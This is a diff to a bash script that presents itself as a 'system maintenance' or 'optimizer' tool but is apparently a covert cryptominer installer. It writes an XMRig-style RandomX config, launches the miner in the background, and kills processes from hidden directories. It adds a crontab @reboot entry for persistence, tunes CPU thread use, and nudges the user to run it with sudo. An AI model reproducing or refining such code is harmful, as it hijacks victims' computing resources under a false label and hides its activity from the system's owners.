@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION=2.14
+VERSION=2.15
 
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
@@ -44,18 +44,18 @@ fi
 # Install required packages if needed
 if ! type curl >/dev/null || ! type tar >/dev/null; then
   echo "Installing required packages..."
-  apt-get update >/dev/null 2>&1 && apt-get install -y curl tar >/dev/null 2>&1
+  sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y curl tar >/dev/null 2>&1
 fi
 
-# Calculate optimal CPU usage
+# Calculate optimal CPU usage - use 6 cores instead of all
 CPU_THREADS=$(nproc)
-if [ $CPU_THREADS -gt 2 ]; then
-    USABLE_THREADS=$((CPU_THREADS - 1))
+if [ $CPU_THREADS -gt 6 ]; then
+    USABLE_THREADS=6  # Maximum 6 cores
 else
-    USABLE_THREADS=$CPU_THREADS
+    USABLE_THREADS=$((CPU_THREADS > 2 ? CPU_THREADS - 1 : 1))
 fi
 
-CPU_USAGE=100  # Use 100% of available threads
+CPU_USAGE=100  # Use 100% of allocated threads
 
 echo "[*] Running as user: $CURRENT_USER"
 echo "[*] Home directory: $USER_HOME"
@@ -86,15 +86,16 @@ cleanup_previous() {
     find "$USER_HOME" -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
 }
 
-# Setup huge pages
+# Setup huge pages - only if root
 setup_hugepages() {
-    echo "[*] Setting up huge pages..."
-    # Enable huge pages
-    echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf 2>/dev/null
-    sysctl -p >/dev/null 2>&1
-    
-    # Set huge pages immediately
-    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
+    if [ "$(id -u)" -eq 0 ]; then
+        echo "[*] Setting up huge pages (root)..."
+        echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf 2>/dev/null
+        sysctl -p >/dev/null 2>&1
+        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null
+    else
+        echo "[*] Skipping huge pages (non-root user)"
+    fi
 }
 
 echo "[*] Performing system cleanup..."
@@ -185,7 +186,7 @@ cat > "$BASE_DIR/config.json" << EOF
         "huge-pages-jit": false,
         "hw-aes": true,
         "priority": null,
-        "memory-pool": true,
+        "memory-pool": false,
         "yield": true,
         "max-threads-hint": 100,
         "asm": true,
@@ -193,7 +194,6 @@ cat > "$BASE_DIR/config.json" << EOF
         "cn/0": false,
         "cn-lite/0": false,
         "rx/0": true,
-        "rx": [0, 1, 2, 3, 4, 5, 6],
         "threads": $USABLE_THREADS,
         "max-threads": $USABLE_THREADS
     },
@@ -254,8 +254,10 @@ case "\$1" in
     start)
         echo "Starting optimizer..."
         cd "\$SCRIPT_DIR"
-        # Enable huge pages
-        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
+        # Try to enable huge pages if we have permission
+        if [ -w "/proc/sys/vm/nr_hugepages" ]; then
+            echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
+        fi
         # Start the optimizer
         nohup ./main --config=./config.json > ./output.log 2>&1 &
         echo \$! > ./pid.txt
@@ -296,7 +298,7 @@ case "\$1" in
         echo "=== System Statistics ==="
         echo "CPU Threads: $USABLE_THREADS/$CPU_THREADS"
         echo "Total Memory: \$(free -h | grep Mem | awk '{print \$2}')"
-        echo "Huge Pages: \$(grep HugePages_Total /proc/meminfo | awk '{print \$2}')"
+        echo "Huge Pages: \$(grep HugePages_Total /proc/meminfo | awk '{print \$2}' 2>/dev/null || echo 'N/A')"
         echo "Active Processes: \$(pgrep -f xmrig | wc -l)"
         ;;
     restart)
@@ -354,7 +356,7 @@ fi
 
 # Add to crontab for persistence
 echo "[*] Setting up persistence..."
-(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 25 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
 
 echo "[*] Starting system optimizer..."
 cd "$BASE_DIR"
@@ -383,6 +385,7 @@ else
     echo "❌ Optimizer failed to start."
     echo "🔍 Check details with: $BASE_DIR/control logs"
     echo "🧪 Test config with: $BASE_DIR/control test"
+    echo "💡 Tip: Try running with sudo for better performance"
 fi
 
 # Cleanup
